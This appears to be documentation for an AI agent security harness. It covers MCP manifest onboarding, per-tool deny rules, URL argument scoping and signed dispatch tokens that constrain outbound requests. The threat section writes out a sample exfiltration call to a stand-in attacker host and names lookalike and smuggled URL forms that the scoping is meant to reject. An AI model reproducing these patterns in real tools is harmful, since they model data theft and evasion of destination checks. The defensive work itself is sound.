# MCP Manifests and Connectivity

If your agent talks to an MCP server (Slack, GitHub, Notion, or anything
else), SHAI's manifest onboarding governs it: an operator-authored manifest
file declares the source's endpoint, tags, and per-tool security metadata,
and `shai mcp onboard` is the one path that approves it for activation — no
unapproved MCP source ever activates.

For the wire itself, SHAI can enforce a **dispatch-token** protocol — every
allowed tool call carries a signed, one-shot, source-bound token that a
custom HTTP transport validates on every request. This closes the gap
between "the gate said yes" and "what actually went out on the network."

Both features are opt-in and independent. You can onboard manifests without
connectivity, connectivity with local sources, or both.

## MCP manifests

There is no bundled/pre-built manifest set — a manifest is entirely
operator-authored and lives outside the package, in `mcp_manifests_dir`. But
a manifest sitting in that directory is not by itself reachable: the source
must also be **declared** under `sources:`, by name, the same way a local
source is:

```yaml
# harness.yaml
mcp_manifests_dir: ./mcp/
mcp_baseline:
  path: state/mcp_baseline.db
  secret: "secret://SHAI_MCP_BASELINE_KEY"
sources:
  - name: slack
    transport: mcp
```

The `sources:` entry carries only `name`/`transport` (plus the fields every
source already has, like `tags`/`required`) — no url, credentials, or
allow-lists there. The manifest is resolved by convention:
`<mcp_manifests_dir>/<name>.yaml`. A manifest file with no matching
`sources:` entry is invisible to the harness; a `transport: mcp` entry with
no manifest at that path is a load error, honouring the entry's `required`
flag.

```yaml
# mcp/slack.yaml
id: slack
display_name: "Slack"
url: "https://mcp.slack.com/sse"
allowed_urls: ["https://mcp.slack.com/*", "https://slack.com/api/*"]
allowed_methods: [GET, POST]
tags: [external_mcp, messaging, external]
credentials:
  token: "secret://SLACK_BOT_TOKEN"
tools:
  - name: send_message
    description: "Send a message to a channel or user"
    tags: [external_write, messaging]
    action: block
  - name: read_messages
    description: "Read messages from a channel"
    tags: [read, messaging]
    action: allow
```

`action` is `allow` or `block`, and it is enforced. At startup each
`action: block` compiles to an ordinary deny rule that the existing policy
layer evaluates, placed ahead of every operator rule — agent-scoped and
global alike. Rules are first-match-wins, so a manifest denial cannot be
weakened by a local rule: the manifest's tool policy is approved by the
manifest's hash through `shai mcp onboard`, and an operator rule in
`harness.yaml` does not get to override it.

`action: allow` compiles to no rule at all. It is the absence of a
restriction, not an affirmative grant — an operator rule denying that tool
still denies it. The manifest adds denials; it never removes them.

At `SHAI.from_yaml()`, each declared `transport: mcp` source's manifest is
resolved, hashed, and checked against the signed baseline store — a live
source is built only for a name whose hash matches an approved record. An
unapproved or hash-mismatched name is not built at all: no stub, no source
object, nothing registered under that name. An agent declaring that source
name gets the same "source not registered" handling any other missing
source gets. For a source that *was* built, approval is re-checked on every
tool call against it: each call re-hashes the manifest (SHA-256 over its raw
bytes) and checks it against the signed local baseline store, behind a short
cache (`mcp_baseline.cache_ttl_seconds`). A hash that no longer matches
denies every subsequent call against that source at the gate — catching a
manifest edited after the harness started without needing a restart.
Approve (or re-approve after an edit) with:

```bash
shai mcp onboard mcp/slack.yaml --config config/harness.yaml
```

This connects live, fetches `tools/list` to confirm reachability, scans the
manifest's own declared tool text, reconciles it against what the server
actually offers, and — on a clean pass — records the manifest's hash as
approved. Running the command *is* the approval; there is no separate flag.
See `.claude/skills/verdicts-events.md` for the `mcp_source_onboarding`
boundary and its audit event shape.

### Per-tool tags are enforced at registration

The manifest is authoritative for what a tool's name, description, and tags
are once it's registered — not the live server's response. So a policy rule
like:

```yaml
- id: block_writes_from_external
  match:
    tool_tags: [external_write]
  action: deny
```

catches `slack.send_message` automatically once the manifest is onboarded
and the source is active, because the manifest tagged that tool
`external_write`.

### Tool results are always scanned

`harness.scan_tool_result(result, ctx)` scans every result. There is no
per-tool opt-out, and manifests do not declare one — a tool whose output
looks like control-plane data is exactly where an indirect-injection payload
arrives unnoticed.

### Narrowing a manifest tool per agent

Agent rules run before global harness rules, so an agent can restrict a tool
its manifest leaves `action: allow`:

```yaml
# agent.yaml
policy_rules:
  - id: no_push_for_reviewer
    match:
      tool_names: [push_files]
    action: deny
    reason: "reviewer agents do not push"
```

The reverse does not work, by design. An agent rule cannot re-enable a tool
the manifest declares `action: block` — the compiled manifest deny runs
ahead of every agent and global rule, and first match wins. To grant a tool,
change the manifest and re-run `shai mcp onboard`, which re-approves the new
file hash. Tags still apply on top of all of this: a `sensitive` tag from
the manifest triggers argument scanning, and an `IRREVERSIBLE` tool still
needs a quorum of signed approval grants. Layered defence.

### Restricting a URL-typed tool argument with `scope_policy`

`allowed_urls` on a source governs where that source's *transport* can
reach. It doesn't help with a tool argument the agent fills in itself — a
webhook URL, a callback, a fetch target — where the destination isn't fixed
by the manifest at all. For that, give the tool's `ArgumentRule` a
`scope_policy`: it canonicalizes the argument value as a URL (case, IDNA,
and IP-literal-encoding differences folded to what the network stack would
actually dial — see `THREAT_MODEL.md`'s T8 residual-risk note) and denies
the call unless the resulting host is in scope.

```yaml
# agent.yaml or manifest override
argument_rules:
  - arg: webhook_url
    scope_policy:
      allowed_domains: [hooks.example.com]
      allow_subdomains: true
```

This accepts `https://alerts.hooks.example.com/x` and
`https://hooks.example.com/x`, and rejects everything else — including a
lookalike like `hooks.example.com.evil.test`, a private/loopback IP
literal (`http://127.0.0.1/...`), and a userinfo-smuggled URL. An IP
literal can only be admitted via `allowed_cidrs`, never `allowed_hosts` or
`allowed_domains` — and, as the note below explains, a private-range
address is denied through `allowed_cidrs` too, with no override at this
layer:

```yaml
argument_rules:
  - arg: callback_url
    scope_policy:
      allowed_cidrs: ["93.184.216.0/24"]   # your callback provider's published range
```

(Watch this if you're tempted to test with a documentation range like
`203.0.113.0/24` — Python's `ipaddress` classifies those as private, so
`scope_policy` denies them too, the same as `127.0.0.0/8` or `10.0.0.0/8`.
Unlike `is_ip_in_scope`'s own `allow_private` parameter, `scope_policy`
has no way to opt back into a private range — an argument-level
destination check is not the place for that escape hatch.)

Prefer `scope_policy` over a hand-written `pattern` regex for any argument
that names a network destination — a regex has to reimplement host
canonicalization to be safe, and `scope_policy` already does it.

## Dispatch tokens and `ShaiTransport`

Once the gate says "yes," what actually goes on the wire? By default, SHAI doesn't know. The tool runs, and if a compromised tool (or LLM-generated code inside a code-execution tool) makes arbitrary outbound requests, the audit trail shows the tool was invoked — but not what it did.

Dispatch tokens close that gap for MCP sources.

### Enable

```yaml
# harness.yaml
connectivity:
  enabled: true
  token_secret: "secret://SHAI_TOKEN_SECRET"    # HMAC-SHA256 signing key
  token_ttl_seconds: 15                          # tokens expire fast
  no_token_policy: permissive                    # permissive | strict
```

`no_token_policy` decides what happens when a request without a token reaches `ShaiTransport`:

- `permissive` — allows untokenised requests through. Useful during rollout, or for connections that legitimately don't carry tokens (SSE handshakes, session init).
- `strict` — rejects anything without a valid token. Correct for production once every path has been verified to issue tokens.

### How it works

On every allowed gate decision, `check_tool_call` issues a `DispatchToken`:

```python
gate = await harness.check_tool_call(tool_name, args, ctx)
# gate.dispatch_token is a signed JWT-like object bound to:
#   - agent_id
#   - tool_name
#   - source_name  (which MCP source this call is destined for)
#   - allowed_urls (from the source's manifest)
#   - allowed_methods
#   - expires_at   (15s by default)
#   - token_id     (UUID nonce for one-time use)
```

Your MCP HTTP client is `ShaiTransport` — an `httpx.AsyncBaseTransport` subclass that:

1. Extracts the token from the outgoing request context.
2. Verifies the signature against `token_secret`.
3. Checks that the request URL matches one of the token's `allowed_urls`.
4. Checks the HTTP method is in `allowed_methods`.
5. Checks the source binding — a token issued for `slack` cannot be used to reach `github`.
6. Checks the nonce hasn't been used before.
7. Injects the `X-Shai-Token` header, forwards the request, and emits a `NetworkAuditEvent`.

Anything that fails validation is refused at the transport layer — the request never reaches the network. If the same token is replayed, the nonce check refuses it.

### What this protects

- A compromised tool implementation that tries to `httpx.post("https://attacker.example/", ...)` — refused at step 3, URL not in `allowed_urls`.
- A tool that was gated for `slack` but tries to reach GitHub's API — refused at step 5, source binding mismatch.
- A replay attack that captures a valid token and reuses it — refused at step 6, nonce spent.
- A token that survives past the tool's return — refused at step 5 in most cases and at step 6 in others; the 15s TTL is a defence in depth.

### Containment: stopping an agent's outbound traffic

The short TTL is not only replay defence — it is the containment property of the
connectivity layer, and worth understanding before you need it.

Every outbound MCP call requires a token minted by `check_tool_call` on the
allow path. Tokens expire in `token_ttl_seconds` (default 15) and each is
single-use. So **the moment the gate stops issuing tokens for an agent, that
agent's outbound MCP traffic stops within one TTL** — `deregister_agent()`, a
policy change that denies, or any other deny path all have the same effect.

Two properties make this worth relying on:

- **It does not need the agent's cooperation.** Enforcement is in
  `ShaiTransport`, on the request path, not in the agent loop. An agent that
  ignores a denial and dispatches anyway is refused at the transport.
- **It is per-agent.** Tokens carry `agent_id`; containing one agent leaves
  every other agent in the process running.

Two limits, equally worth knowing:

- **Only tools that dispatch through `ShaiTransport` are covered** — the same
  boundary as everything else on this page. A code-execution tool shelling out
  to `curl` is outside it.
- **`connectivity.enabled` defaults to `false`.** With it off, no tokens are
  issued, `ShaiTransport` is not installed, and none of this applies. It is
  opt-in, and this is the reason to opt in.

The TTL is the containment latency. Raising `token_ttl_seconds` to reduce
re-issuance overhead raises the window during which an already-issued token
still works.

### What it does not protect

- Non-MCP outbound calls that don't go through `ShaiTransport`. `subprocess.run("curl ...")` in a code-execution tool is invisible. Network egress control at the infrastructure layer is the right place for that.
- SSE handshakes and MCP session initialisation, in `permissive` mode. Move to `strict` once you've confirmed tokens are issued on every path you care about.

## What next

- [testing.md](testing.md) — writing tests that verify your connector + connectivity config
- [errors.md](errors.md) — token-validation exceptions and their meanings
- [`.claude/skills/connectors.md`](../.claude/skills/connectors.md) and [`.claude/skills/connectivity.md`](../.claude/skills/connectivity.md) — full field reference
